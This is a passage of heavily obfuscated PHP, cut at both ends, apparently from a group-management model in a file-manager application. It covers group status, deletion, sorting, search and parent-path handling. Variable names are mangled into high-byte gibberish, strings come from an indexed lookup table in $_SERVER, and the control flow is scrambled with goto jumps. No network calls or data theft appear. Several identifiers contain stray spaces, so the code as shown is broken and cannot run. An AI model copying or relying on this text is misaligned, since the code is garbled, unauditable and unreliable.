$FöÍ¤ñ‡´©[446] => Pinyin::encode($cº°ÍâÁ’, $FöÍ¤ñ‡´©[561])); $this->metaSet($A“°Ş–Õùº, $A¬ñ×Óß); } protected function groupStatus($FÅª©¡¨„­, $D»šÌñ«ÍŠ) { goto cŒÏ‘ÊòÅº; fß’İ“ŞÌ÷: if ($D»šÌñ«ÍŠ == $bÅâ‹î«Ø[96]) { $D˜ÌÀœĞóÂ = $this->parentLevelArray($Eßºô‚ÒÌ[$bÅâ‹î«Ø[490]]); } else { $E¦öÄ‹¾ñ‚ = array($bÅâ‹î«Ø[557] => array($bÅâ‹î«Ø[516], $Eßºô‚ÒÌ[$bÅâ‹î«Ø[490]] . $Eßºô‚ÒÌ[$bÅâ‹î«Ø[1650]] . $bÅâ‹î«Ø[517])); $D˜ÌÀœĞóÂ = $this->where($E¦öÄ‹¾ñ‚)->field($bÅâ‹î«Ø[1650])->select(); $D˜ÌÀœĞóÂ = array_to_keyvalue($D˜ÌÀœĞóÂ, $bÅâ‹î«Ø[33], $bÅâ‹î«Ø[1650]); } $D˜ÌÀœĞóÂ[] = $Eßºô‚ÒÌ[$bÅâ‹î«Ø[1650]]; $fğ°ñœÓ½ = array(); goto dÊÂ¸À——£; cŒÏ‘ÊòÅº: $bÅâ‹î«Ø =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Eßºô‚ÒÌ = $this->getInfoSimple($FÅª©¡¨„­); if (!$Eßºô‚ÒÌ) { return !1; } goto fß’İ“ŞÌ÷; dÊÂ¸À——£: foreach ($D˜ÌÀœĞóÂ as $FÅª©¡¨„­) { $fğ°ñœÓ½[] = array($bÅâ‹î«Ø[1650] => $FÅª©¡¨„­, $bÅâ‹î«Ø[102] => $bÅâ‹î«Ø[694], $bÅâ‹î«Ø[380] => $D»šÌñ«ÍŠ); } return Model($bÅâ‹î«Ø[1731])->addAll($fğ°ñœÓ½, array(), !0); goto eöåí°šÇ¨; eöåí°šÇ¨: } protected function groupRemove($a¼¢ˆ²á£ğ) { goto FóëÁí§Î…; C¬Õ§µù¼: Model($e¤ÉƒÂôé­[759])->groupRootRemove($a¼¢ˆ²á£ğ); return $this->where($bšÇØŞÔË)->delete(); goto eÃ¤ÑˆÉ¬­; FóëÁí§Î…: $e¤ÉƒÂôé­ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bšÇØŞÔË = array($e¤ÉƒÂôé­[1650] => $a¼¢ˆ²á£ğ); $E‘®Œ¯Îù = $this->where($bšÇØŞÔË)->find(); goto fÚ’Ú‚ÊœÉ; Dê§ñ¨õã“: $this->where(array($e¤ÉƒÂôé­[481] => $a¼¢ˆ²á£ğ))->save(array($e¤ÉƒÂôé­[481] => $E‘®Œ¯Îù[$e¤ÉƒÂôé­[481]])); Model($e¤ÉƒÂôé­[1731])->where($bšÇØŞÔË)->delete(); Model($e¤ÉƒÂôé­[1732])->where($bšÇØŞÔË)->delete(); goto C¬Õ§µù¼; fÚ’Ú‚ÊœÉ: if (!$E‘®Œ¯Îù || $E‘®Œ¯Îù[$e¤ÉƒÂôé­[481]] == 0) { return !1; } $BåùÎÉ¶•ö = $this->getInfoSimple($E‘®Œ¯Îù[$e¤ÉƒÂôé­[481]]); $this->_changeChildLevel($E‘®Œ¯Îù, $BåùÎÉ¶•ö, !0); goto Dê§ñ¨õã“; eÃ¤ÑˆÉ¬­: } protected function groupSort($eîË¡È¤è) { $D“°¡ŒŸˆ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fË¥“ĞÁ” = array(); foreach ($eîË¡È¤è as $EÜ—‰çøÍî => $a…Ø½¶Íğã) { $fË¥“ĞÁ”[] = array($D“°¡ŒŸˆ[1650], $a…Ø½¶Íğã, $D“°¡ŒŸˆ[1673], $EÜ—‰çøÍî + 1); } $this->saveAll($fË¥“ĞÁ”); } public function listData() { $b¹Ëó™ì¶ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($b¹Ëó™ì¶[$_SERVER[í¤âËÚ£¶íÊ¢][375]]); return $b¹Ëó™ì¶; } private function _makeOrder($d¢ Ä‚Êƒ¡ = '') { goto A§Œ©™ä“; A§Œ©™ä“: $c—‹¨·ˆĞ¡ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Eƒ»‚øÉâ = array($c—‹¨·ˆĞ¡[1650], $c—‹¨·ˆĞ¡[28], $c—‹¨·ˆĞ¡[1636], $c—‹¨·ˆĞ¡[202]); $bĞæÅ…Ä¥  = array($c—‹¨·ˆĞ¡[431] => $c—‹¨·ˆĞ¡[432], $c—‹¨·ˆĞ¡[433] => $c—‹¨·ˆĞ¡[434]); goto f‘Á†‘«Ùˆ; f‘Á†‘«Ùˆ: $AöŒœ­é‚ = Input::get($c—‹¨·ˆĞ¡[438], $c—‹¨·ˆĞ¡[7], $c—‹¨·ˆĞ¡[1654], $Eƒ»‚øÉâ); $BÃŠÕ÷¦êÈ = Input::get($c—‹¨·ˆĞ¡[439], $c—‹¨·ˆĞ¡[7], $c—‹¨·ˆĞ¡[1733], array($c—‹¨·ˆĞ¡[1733], $c—‹¨·ˆĞ¡[433])); $BÃŠÕ÷¦êÈ = $bĞæÅ…Ä¥ [$BÃŠÕ÷¦êÈ]; goto dƒíÒÒê„; dƒíÒÒê„: $d¢ Ä‚Êƒ¡ = $d¢ Ä‚Êƒ¡ . "{$AöŒœ­é‚}\x20{$BÃŠÕ÷¦êÈ}\54\40\x67\x72\157\165\x70\x49\x44\40\x61\163\143"; return $this->order($d¢ Ä‚Êƒ¡); goto BƒÉƒÀâ·¡; BƒÉƒÀâ·¡: } public function listChild($f«³ÙÀ‚†õ) { $a‚ˆÛµ†˜ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $B¦™ß¤­© = $this->where(array($a‚ˆÛµ†˜[481] => $f«³ÙÀ‚†õ))->_makeOrder()->selectPage(200); $this->_listDataApply($B¦™ß¤­©[$a‚ˆÛµ†˜[375]]); return $B¦™ß¤­©; } public function listByID($F¯Ø®Ş°ï) { $A»¼ó¾‹¡ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$F¯Ø®Ş°ï) { return array(); } $A‘ˆ§Ûì„‘ = array($A»¼ó¾‹¡[1650] => array($A»¼ó¾‹¡[7], $F¯Ø®Ş°ï)); $c°ÛµæœÌœ = $this->where($A‘ˆ§Ûì„‘)->select(); $this->_listDataApply($c°ÛµæœÌœ); return $c°ÛµæœÌœ; } public function listSearch($ešë« Ïô) { goto cõ÷¬¶±‚ë; A¯¢²…·Ä‡: if ($Cßìãõ³é¶) { $E¸ƒµ—‚Û = $this->getInfoSimple($Cßìãõ³é¶); $aˆ›½Š = $E¸ƒµ—‚Û[$eâ™ñŠ±[490]] . $Cßìãõ³é¶ . $eâ™ñŠ±[517]; $f¿ÒÇƒÇó´ = array($f¿ÒÇƒÇó´, array($eâ™ñŠ±[490] => array($eâ™ñŠ±[387], $aˆ›½Š))); } $f¿ÒÇƒÇó´ = $this->parseWhereLike($f¿ÒÇƒÇó´); $Bìš©¤ÔÎ± = $this->_makeOrder()->where($f¿ÒÇƒÇó´)->selectPage(20); goto DØ…Éºø‚¯; DØ…Éºø‚¯: $Bìš©¤ÔÎ± = $Bìš©¤ÔÎ± ? $Bìš©¤ÔÎ± : array($eâ™ñŠ±[375] => array(), $eâ™ñŠ±[372] => array()); if (!$Bìš©¤ÔÎ± || count($Bìš©¤ÔÎ±[$eâ™ñŠ±[375]]) < 5 && Input::check($f‘±áˆÀºî, $eâ™ñŠ±[323])) { goto AÍ×½æç‰¥; AÍ×½æç‰¥: $AÖèé¸Ö˜ƒ = $this->groupChildrenAll($Cßìãõ³é¶); $EÌ‹ìÓà‡— = $this->_searchFromMeta($eâ™ñŠ±[446], $f‘±áˆÀºî, 10, $AÖèé¸Ö˜ƒ); $AšŞÒ©¦ç« = $this->_searchFromMeta($eâ™ñŠ±[447], $f‘±áˆÀºî, 10, $AÖèé¸Ö˜ƒ); goto f«İêµ¥Ìö; CæÚæß‰î‡: $Bìš©¤ÔÎ±[$eâ™ñŠ±[372]][$eâ™ñŠ±[374]] = ceil($Bìš©¤ÔÎ±[$eâ™ñŠ±[372]][$eâ™ñŠ±[373]] / $Bìš©¤ÔÎ±[$eâ™ñŠ±[372]][$eâ™ñŠ±[369]]); goto FöŠÌ¬¡¯; f«İêµ¥Ìö: $eº¹¦¬©æ… = array_merge($EÌ‹ìÓà‡—, $AšŞÒ©¦ç«, $Bìš©¤ÔÎ±[$eâ™ñŠ±[375]]); $Bìš©¤ÔÎ±[$eâ™ñŠ±[375]] = array_unique_by_key($eº¹¦¬©æ…, $eâ™ñŠ±[1650]); $Bìš©¤ÔÎ±[$eâ™ñŠ±[372]][$eâ™ñŠ±[373]] = count($Bìš©¤ÔÎ±[$eâ™ñŠ±[375]]); goto CæÚæß‰î‡; FöŠÌ¬¡¯: } $this->_listDataApply($Bìš©¤ÔÎ±[$eâ™ñŠ±[375]]); goto D“²›ãÎ±ì; D“²›ãÎ±ì: return $Bìš©¤ÔÎ±; goto EºçÄ˜ØÇº; céŒ‚³½: if (!trim($f‘±áˆÀºî)) { return !1; } $f‘±áˆÀºî = str_replace($eâ™ñŠ±[1736], $eâ™ñŠ±[1737], $f‘±áˆÀºî); $f¿ÒÇƒÇó´ = array($eâ™ñŠ±[1650] => array($eâ™ñŠ±[387], "{$f‘±áˆÀºî}\x25"), $eâ™ñŠ±[28] => array($eâ™ñŠ±[387], "\x25{$f‘±áˆÀºî}\45"), $eâ™ñŠ±[918] => $eâ™ñŠ±[1738]); goto A¯¢²…·Ä‡; cõ÷¬¶±‚ë: $eâ™ñŠ± =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f‘±áˆÀºî = $ešë« Ïô[$eâ™ñŠ±[1734]]; $Cßìãõ³é¶ = isset($ešë« Ïô[$eâ™ñŠ±[1735]]) ? $ešë« Ïô[$eâ™ñŠ±[1735]] : !1; goto céŒ‚³½; EºçÄ˜ØÇº: } protected function groupChildrenAll($dòö„ÑÅ) { $AÁê¯½ø­ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$dòö„ÑÅ) { return !1; } if (is_string($dòö„ÑÅ)) { $dòö„ÑÅ = array($dòö„ÑÅ); } $aç×Æè¡´ = $dòö„ÑÅ; foreach ($dòö„ÑÅ as $e­¦ÀÃÍùÓ) { $EŸÎô­ã¸í = $this->getInfoSimple($e­¦ÀÃÍùÓ); $C¦ÊÄ©«Ãë = array($AÁê¯½ø­[490] => array($AÁê¯½ø­[387], $EŸÎô­ã¸í[$AÁê¯½ø­[490]] . $e­¦ÀÃÍùÓ . $AÁê¯½ø­[517])); $fÆ‚ ¢º ± = $this->field($AÁê¯½ø­[1650])->where($C¦ÊÄ©«Ãë)->select(); $aç×Æè¡´ = array_merge($aç×Æè¡´, array_to_keyvalue($fÆ‚ ¢º ±, $AÁê¯½ø­[33], $AÁê¯½ø­[1650])); } return array_unique($aç×Æè¡´); } private function _searchFromMeta($c¤†ø³âºç, $câ£´Ë¯Ÿ‡, $bÈİÜ¸Ñ, $C·Ìê•¬ƒ) { goto f‰Æá‡À½Û; aó¾¹ôÂ·Â: $f•¦ÒË’ñ = $this->parseWhereLike($f•¦ÒË’ñ); if ($C·Ìê•¬ƒ) { $f•¦ÒË’ñ[$aªøñÂ¯ÕÚ[1650]] = array($aªøñÂ¯ÕÚ[7], $C·Ìê•¬ƒ); } $BÈ‰ëŸ…î = Model($aªøñÂ¯ÕÚ[1739])->where($f•¦ÒË’ñ)->limit($bÈİÜ¸Ñ)->select(); goto C¼¸ïùÜ–„; f‰Æá‡À½Û: $aªøñÂ¯ÕÚ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $câ£´Ë¯Ÿ‡ = strtolower($câ£´Ë¯Ÿ‡); $f•¦ÒË’ñ = array($aªøñÂ¯ÕÚ[102] => $c¤†ø³âºç, $aªøñÂ¯ÕÚ[380] => array($aªøñÂ¯ÕÚ[387], "\x25{$câ£´Ë¯Ÿ‡}\x25")); goto aó¾¹ôÂ·Â; e‚Åß‘ÜŞ: if (!$bïÕÃ»µù”) { return array(); } return $bïÕÃ»µù”; goto E–§ê£æÜù; C¼¸ïùÜ–„: if (!$BÈ‰ëŸ…î) { return array(); } $BÈ‰ëŸ…î = array_to_keyvalue($BÈ‰ëŸ…î, $aªøñÂ¯ÕÚ[33], $aªøñÂ¯ÕÚ[1650]); $bïÕÃ»µù” = $this->where(array($aªøñÂ¯ÕÚ[1729] => array($aªøñÂ¯ÕÚ[7], $BÈ‰ëŸ…î)))->select(); goto e‚Åß‘ÜŞ; E–§ê£æÜù: } protected function _listDataApplyItem($eÒÅŠ‘ŒÔÔ) { $cµëá¥¬Ğ‚ = array($eÒÅŠ‘ŒÔÔ); $this->_listDataApply($cµëá¥¬Ğ‚); return $cµëá¥¬Ğ‚[0]; } protected function _listDataApply(&$DÇİ­œÃÚ) { goto bÒ³õ‘¥‚À; bÒ³õ‘¥‚À: $F”ŠâÎˆÃ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$DÇİ­œÃÚ) { return; } $Cª”œ‰Â‡ = array_to_keyvalue($DÇİ­œÃÚ, $F”ŠâÎˆÃ[33], $F”ŠâÎˆÃ[1650]); goto e•õ÷¿„šà; e•õ÷¿„šà: $this->_listAppendChildren($DÇİ­œÃÚ); $this->_listAppendChildrenMember($DÇİ­œÃÚ); $this->_listAppendMeta($DÇİ­œÃÚ, $Cª”œ‰Â‡); goto F¨†‚Ó™ï±; F¨†‚Ó™ï±: $this->_listAppendParent($DÇİ­œÃÚ); $this->_listAppendSourceRoot($DÇİ­œÃÚ, $Cª”œ‰Â‡); goto b Á ½ÖÁÁ; b Á ½ÖÁÁ: } private function _listAppendChildren(&$fÂËíŒ§ìó) { goto Dª ›•îÜ; AÀ¸’áÁŠÕ: foreach ($fÂËíŒ§ìó as &$DÛèÁ‰) { $a¢ËÂÂÜçó = $DÛèÁ‰[$aôÎ–Ñ‚˜Ö[1650]]; $DÛèÁ‰[$aôÎ–Ñ‚˜Ö[1741]] = isset($EÆÈ‘Ø…ê¦[$a¢ËÂÂÜçó]) ? intval($EÆÈ‘Ø…ê¦[$a¢ËÂÂÜçó]) : !1; } unset($DÛèÁ‰); goto EÎƒ—Ï…¥…; Dª ›•îÜ: $aôÎ–Ñ‚˜Ö =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aÉÊÕ„”ÒŸ = array_to_keyvalue($fÂËíŒ§ìó, $aôÎ–Ñ‚˜Ö[33], $aôÎ–Ñ‚˜Ö[1650]); $D³àåƒİé = array($aôÎ–Ñ‚˜Ö[481] => array($aôÎ–Ñ‚˜Ö[7], $aÉÊÕ„”ÒŸ)); goto a²½ÎÜƒÏÄ; a²½ÎÜƒÏÄ: $c±èÛÓ¤¹ª = array($aôÎ–Ñ‚˜Ö[481], $aôÎ–Ñ‚˜Ö[1740] => $aôÎ–Ñ‚˜Ö[483]); $DäËŠ´’ËÛ = $this->field($c±èÛÓ¤¹ª)->where($D³àåƒİé)->group($aôÎ–Ñ‚˜Ö[481])->select(); $EÆÈ‘Ø…ê¦ = array_to_keyvalue($DäËŠ´’ËÛ, $aôÎ–Ñ‚˜Ö[481], $aôÎ–Ñ‚˜Ö[483]); goto AÀ¸’áÁŠÕ; EÎƒ—Ï…¥…: } private function _listAppendChildrenMember(&$F‡‡ĞâÙ‹Ì) { goto c¼ó’ÚŠ†é; Eåõ•ß«¤Ë: $Eõ«¸öµ¯² = array($aàÎ£ïç‡ó[1650], $aàÎ£ïç‡ó[1740] => $aàÎ£ïç‡ó[483]); $b’Á«Ó‘ìº = Model($aàÎ£ïç‡ó[1732])->field($Eõ«¸öµ¯²)->where($eæè‰Üê•¼)->group($aàÎ£ïç‡ó[1650])->select(); $Aò²ò”£ó = array_to_keyvalue($b’Á«Ó‘ìº, $aàÎ£ïç‡ó[1650], $aàÎ£ïç‡ó[483]); goto AÕÌÔ¢ŒÓ˜; c¼ó’ÚŠ†é: $aàÎ£ïç‡ó =& $_SERVER[í¤âËÚ£¶íÊ¢]; $d±÷·–Ò¨‡ = array_to_keyvalue($F‡‡ĞâÙ‹Ì, $aàÎ£ïç‡ó[33], $aàÎ£ïç‡ó[1650]); $eæè‰Üê•¼ = array($aàÎ£ïç‡ó[1650] => array($aàÎ£ïç‡ó[7], $d±÷·–Ò¨‡)); goto Eåõ•ß«¤Ë; AÕÌÔ¢ŒÓ˜: foreach ($F‡‡ĞâÙ‹Ì as &$eÜ÷ä’šñ) { $d®ÅñŞ£ôğ = $eÜ÷ä’šñ[$aàÎ£ïç‡ó[1650]]; $eÜ÷ä’šñ[$aàÎ£ïç‡ó[1742]] = isset($Aò²ò”£ó[$d®ÅñŞ£ôğ]) ? intval($Aò²ò”£ó[$d®ÅñŞ£ôğ]) : !1; } unset($eÜ÷ä’šñ); goto Dõ ëî îš; Dõ ëî îš: } private function _listAppendMeta(&$bÂ¼°Ñæ”, $D»ÒŸ¢ÂáŞ) { goto B¹»¿«µ®; Dà×ïŒ®æÀ: $C‰§‚†ÜÕ = array_to_keyvalue_group($C‰§‚†ÜÕ, $cªÄğòĞò„[1650]); foreach ($C‰§‚†ÜÕ as &$aÛ°ÃÍ«´º) { $aÛ°ÃÍ«´º = array_to_keyvalue($aÛ°ÃÍ«´º, $cªÄğòĞò„[102], $cªÄğòĞò„[380]); } unset($aÛ°ÃÍ«´º); goto B™ãäŸÇÍÁ; B¹»¿«µ®: $cªÄğòĞò„ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fÊÆŒÃ¥›œ = array($cªÄğòĞò„[1650] => array($cªÄğòĞò„[7], $D»ÒŸ¢ÂáŞ)); $C‰§‚†ÜÕ = Model($cªÄğòĞò„[1731])->where($fÊÆŒÃ¥›œ)->select(); goto Dà×ïŒ®æÀ; B™ãäŸÇÍÁ: foreach ($bÂ¼°Ñæ” as &$CòÈ„£Š±‘) { $CòÈ„£Š±‘[$cªÄğòĞò„[448]] = array(); if (isset($C‰§‚†ÜÕ[$CòÈ„£Š±‘[$cªÄğòĞò„[1650]]])) { $CòÈ„£Š±‘[$cªÄğòĞò„[448]] = $C‰§‚†ÜÕ[$CòÈ„£Š±‘[$cªÄğòĞò„[1650]]]; } } unset($CòÈ„£Š±‘); goto dêÃ©“÷‡È; dêÃ©“÷‡È: } protected function parentLevelArray($EĞß¸ßÃÎĞ) { $dâÎ¢‹ ªù =& $_SERVER[í¤âËÚ£¶íÊ¢]; $EĞß¸ßÃÎĞ = explode($dâÎ¢‹ ªù[47], trim($EĞß¸ßÃÎĞ, $dâÎ¢‹ ªù[47])); $EĞß¸ßÃÎĞ = array_remove_value($EĞß¸ßÃÎĞ, $dâÎ¢‹ ªù[500]); return $EĞß¸ßÃÎĞ; } private function _listAppendParent(&$EŞ—†È‹’Ï) { goto Eâ«Í›À¥Ë; cá’È™™»ô: if ($GLOBALS[$AºÌ¬Óîô[488]] == $AºÌ¬Óîô[96]) { $d³ÍÑˆÆš = !1; } foreach ($EŞ—†È‹’Ï as &$c˜Ê‡Öë) { $BÉÉ‰Ü¶Ï¿ = $this->parentLevelArray($c˜Ê‡Öë[$AºÌ¬Óîô[490]]); $C³âíËŠ‹ = $AºÌ¬Óîô[33]; foreach ($BÉÉ‰Ü¶Ï¿ as $dËŞ†Šƒ => $F¢°ÛÆìÙ ) { if ($d³ÍÑˆÆš && $dËŞ†Šƒ == 0) { continue; } $C³âíËŠ‹ .= $F„÷ºÍ „¡[$F¢°ÛÆìÙ ] . $AºÌ¬Óîô[8]; } if ($BÉÉ‰Ü¶Ï¿) { $C³âíËŠ‹ .= $c˜Ê‡Öë[$AºÌ¬Óîô[28]]; } $c˜Ê‡Öë[$AºÌ¬Óîô[494]] = str_replace($AºÌ¬Óîô[499], $AºÌ¬Óîô[8], $C³âíËŠ‹); } unset($c˜Ê‡Öë); goto f»Ñ•Ÿ‰„«; aÂ…ÆÃĞ¼Õ: unset($c˜Ê‡Öë); foreach ($F„÷ºÍ „¡ as $dËŞ†Šƒ => $cùäÍ‰ŒšÖ) { if ($cùäÍ‰ŒšÖ) { continue; } $C«ì± ‘Úù = $this->getInfoSimple($dËŞ†Šƒ); $F„÷ºÍ „¡[$dËŞ†Šƒ] = $C«ì± ‘Úù[$AºÌ¬Óîô[28]]; } $d³ÍÑˆÆš = $GLOBALS[$AºÌ¬Óîô[6]][$AºÌ¬Óîô[97]][$AºÌ¬Óîô[1743]]; goto cá’È™™»ô; Eâ«Í›À¥Ë: $AºÌ¬Óîô =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F„÷ºÍ „¡ = array(); foreach ($EŞ—†È‹’Ï as &$c˜Ê‡Öë) { $F„÷ºÍ „¡[$c˜Ê‡Öë[$AºÌ¬Óîô[1650]]] = $c˜Ê‡Öë[$AºÌ¬Óîô[28]]; $BÉÉ‰Ü¶Ï¿ = $this->parentLevelArray($c˜Ê‡Öë[$AºÌ¬Óîô[490]]); foreach ($BÉÉ‰Ü¶Ï¿ as $F¢°ÛÆìÙ ) { if (!isset($F„÷ºÍ „¡[$F¢°ÛÆìÙ ])) { $F„÷ºÍ „¡[$F¢°ÛÆìÙ ] = 0; } } } goto aÂ…ÆÃĞ¼Õ; f»Ñ•Ÿ‰„«: } private function _listAppendSourceRoot(&$eŸĞ—ô‹¾, $f“¹¶õÓÊ) { goto d‰“ÇÁé’ê; FÜ¹¸ÓÈ² : foreach ($eŸĞ—ô‹¾ as &$cï¯¨™ÕŒ») { $cï¯¨™ÕŒ»[$cì¢ô©´§â[94]] = $C÷éñ°ôéŸ[$cï¯¨™ÕŒ»[$cì¢ô©´§â[1650]]] ? $C÷éñ°ôéŸ[$cï¯¨™ÕŒ»[$cì¢ô©´§â[1650]]] : array(); } unset($cï¯¨™ÕŒ»); goto D·©ğˆøÊ; fàŠ³©º‰š: $C÷éñ°ôéŸ = Model($cì¢ô©´§â[759])->order($cì¢ô©´§â[1745])->field($fƒ¨õ¡¯¾í)->where($f…¬±óš–ù)->select(); $C÷éñ°ôéŸ = array_to_keyvalue($C÷éñ°ôéŸ, $cì¢ô©´§â[487]); $C÷éñ°ôéŸ = array_remove_key($C÷éñ°ôéŸ, $cì¢ô©´§â[487]); goto FÜ¹¸ÓÈ² ; d‰“ÇÁé’ê: $cì¢ô©´§â =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f…¬±óš–ù = array($cì¢ô©´§â[407] => SourceModel::TYPE_GROUP, $cì¢ô©´§â[481] => 0, $cì¢ô©´§â[487] => array($cì¢ô©´§â[7], $f“¹¶õÓÊ)); $fƒ¨õ¡¯¾í = $cì¢ô©´§â[1744]; goto fàŠ³©º‰š; D·©ğˆøÊ: } protected function groupMerge($C¥È¹Û‡éô) { $C¥È¹Û‡éô = array_values(array_unique($C¥È¹Û‡éô)); $dæà¶óæ = array(); for ($FÒ•Åã‘à = 0; $FÒ•Åã‘à < count($C¥È¹Û‡éô); $FÒ•Åã‘à++) { $bØ‘»Òè† = !1; for ($cçÜç·áÇá = 0; $cçÜç·áÇá < count($C¥È¹Û‡éô); $cçÜç·áÇá++) { if ($FÒ•Åã‘à == $cçÜç·áÇá) { continue; } if ($this->isParentOf($C¥È¹Û‡éô[$cçÜç·áÇá], $C¥È¹Û‡éô[$FÒ•Åã‘à])) { $bØ‘»Òè† = !0; break; } } if (!$bØ‘»Òè†) { $dæà¶óæ[] = $C¥È¹Û‡éô[$FÒ•Åã‘à]; } } return $dæà¶óæ; } protected function isParentOf($fÓ‡ÒÉóß…, $B¼ääíí’Ø) { goto D¡–ˆëÅù; f¥Ê÷½ŸÂ: return !1; goto eÖ‡Ã‡É¨Õ; D¡–ˆëÅù: $cÎĞÊ½÷ù‹ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$fÓ‡ÒÉóß… || !$B¼ääíí’Ø || $fÓ‡ÒÉóß… == $B¼ääíí’Ø) { return !1; } $c¾‹°‘‚Ä… = $this->getInfoSimple($fÓ‡ÒÉóß…); goto d·£¼Ö«¤ˆ; d·£¼Ö«¤ˆ: $AÓè÷ÇŠÓ‚ = $this->getInfoSimple($B¼ääíí’Ø); $EÒÓó•¿‡ô = $c¾‹°‘‚Ä…[$cÎĞÊ½÷ù‹[490]] . $fÓ‡ÒÉóß… . $cÎĞÊ½÷ù‹[47]; if (substr($AÓè÷ÇŠÓ‚[$cÎĞÊ½÷ù‹[490]], 0, strlen($EÒÓó•¿‡ô)) == $EÒÓó•¿‡ô) { return !0; } goto f¥Ê÷½ŸÂ; eÖ‡Ã‡É¨Õ: } public function groupShowRoot($A¨Ş«êÀôŸ, $BğÃ±×¢•õ = false) { goto eµ¼°Ñ¸–†; c‚ºÁ²‚­Œ: return $cƒÓÜ¬¥ÀĞ; goto cµ‡„‹ÍŠ²; EèŞ­–»é: if ($BğÃ±×¢•õ && count($E³¾íŒÖ…¢) == 1) { return $cƒÓÜ¬¥ÀĞ; } if (!$eÂæ¼‚Ç¼[$bÌ»Ä‹ôŒß[448]] || !isset($eÂæ¼‚Ç¼[$bÌ»Ä‹ôŒß[448]][$bÌ»Ä‹ôŒß[1727]]) || $eÂæ¼‚Ç¼[$bÌ»Ä‹ôŒß[448]][$bÌ»Ä‹ôŒß[1727]] == $bÌ»Ä‹ôŒß[1701]) { return $this->groupShowRoot($E³¾íŒÖ…¢[count($E³¾íŒÖ…¢) - 1], $BğÃ±×¢•õ); } if ($eÂæ¼‚Ç¼[$bÌ»Ä‹ôŒß[448]][$bÌ»Ä‹ôŒß[1727]] == $bÌ»Ä‹ôŒß[365]) { $C—Ù«çøì = explode($bÌ»Ä‹ôŒß[47], $eÂæ¼‚Ç¼[$bÌ»Ä‹ôŒß[448]][$bÌ»Ä‹ôŒß[1728]]); if ($C—Ù«çøì) { $cƒÓÜ¬¥ÀĞ = array_merge($cƒÓÜ¬¥ÀĞ, $C—Ù«çøì); } } goto c‚ºÁ²‚­Œ; fÊÀƒ¬°¦Î: $E³¾íŒÖ…¢ = $this->parentLevelArray($eÂæ¼‚Ç¼[$bÌ»Ä‹ôŒß[490]]); $cƒÓÜ¬¥ÀĞ = array($A¨Ş«êÀôŸ); if (count($E³¾íŒÖ…¢) == 0) { return $cƒÓÜ¬¥ÀĞ; } goto EèŞ­–»é; eµ¼°Ñ¸–†: $bÌ»Ä‹ôŒß =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eÂæ¼‚Ç¼ = $this->getInfo($A¨Ş«êÀôŸ); if (!$eÂæ¼‚Ç¼) { return array(); } goto fÊÀƒ¬°¦Î; cµ‡„‹ÍŠ²: } protected function resetParentLevel() { $E°èçï«å‚ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Fƒ°Ó–ØŒİ = $E°èçï«å‚[1650]; $FĞù‰Ñ”Ú© = $this->select(); $FĞù‰Ñ”Ú© = array_to_keyvalue($FĞù‰Ñ”Ú©, $Fƒ°Ó–ØŒİ); foreach ($FĞù‰Ñ”Ú© as $eŠåÌÎ‰®º) { goto B†—À¿ù±È; Fƒ—„Ÿê: $Bˆ¥¹œîâí[] = 0; $Bˆ¥¹œîâí = $E°èçï«å‚[47] . implode($E°èçï«å‚[47], array_reverse($Bˆ¥¹œîâí)) . $E°èçï«å‚[47]; $this->setNamePinyin($eŠåÌÎ‰®º[$Fƒ°Ó–ØŒİ], $eŠåÌÎ‰®º[$E°èçï«å‚[28]]); goto E¡åÏó¥ËĞ; E¡åÏó¥ËĞ: $this->where(array($Fƒ°Ó–ØŒİ => $eŠåÌÎ‰®º[$Fƒ°Ó–ØŒİ]))->save(array($E°èçï«å‚[557] => $Bˆ¥¹œîâí)); goto c­®õªù¯¿; B†—À¿ù±È: $fôŸíÚ“«’ = $eŠåÌÎ‰®º; $Bˆ¥¹œîâí = array(); while ($fôŸíÚ“«’[$E°èçï«å‚[481]] != 0) { $Bˆ¥¹œîâí[] = $fôŸíÚ“«’[$E°èçï«å‚[481]]; $fôŸíÚ“«’ = $FĞù‰Ñ”Ú©[$fôŸíÚ“«’[$E°èçï«å‚[481]]]; } goto Fƒ—„Ÿê; c­®õªù¯¿: } return $FĞù‰Ñ”Ú©; } public function groupNameAuto($B¦ïŒÉ•, $b¶‚í‰ö) { $e¤š¯ŠîéÌ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eç„¾ˆï½ = $this->where(array($e¤š¯ŠîéÌ[398] => $B¦ïŒÉ•))->getField($e¤š¯ŠîéÌ[28], !0); if (!$eç„¾ˆï½ || !in_array($b¶‚í‰ö, $eç„¾ˆï½)) { return $b¶‚í‰ö; } for ($eá¢ß = 1; $eá¢ß <= count($eç„¾ˆï½) + 1; $eá¢ß++) { $CÆù„»â¡Ÿ = $b¶‚í‰ö . "\x28{$eá¢ß}\51"; if (!in_array($CÆù„»â¡Ÿ, $eç„¾ˆï½)) { return $CÆù„»â¡Ÿ; } } } public function groupSwitch($d’áğïËïñ, $EÙƒÉ‚¯ÉÌ) { goto dë„à§›»; dë„à§›»: $cÜßŞ¶ÔÏç =& $_SERVER[í¤âËÚ£¶íÊ¢]; $CÙß¯œ©„­ = array($cÜßŞ¶ÔÏç[1650] => array($cÜßŞ¶ÔÏç[7], array($d’áğïËïñ, $EÙƒÉ‚¯ÉÌ))); $FìÕÓ©Ñ…Ó = $this->where($CÙß¯œ©„­)->select(); goto dÈÈåç¬’²; D•²ÚÉ¼ç‘: $CÙß¯œ©„­ = array($cÜßŞ¶ÔÏç[407] => 2, $cÜßŞ¶ÔÏç[481] => 0, $cÜßŞ¶ÔÏç[406] => 1, $cÜßŞ¶ÔÏç[487] => array($cÜßŞ¶ÔÏç[7], array($d’áğïËïñ, $EÙƒÉ‚¯ÉÌ))); $E˜´‹êŠ‹ò = 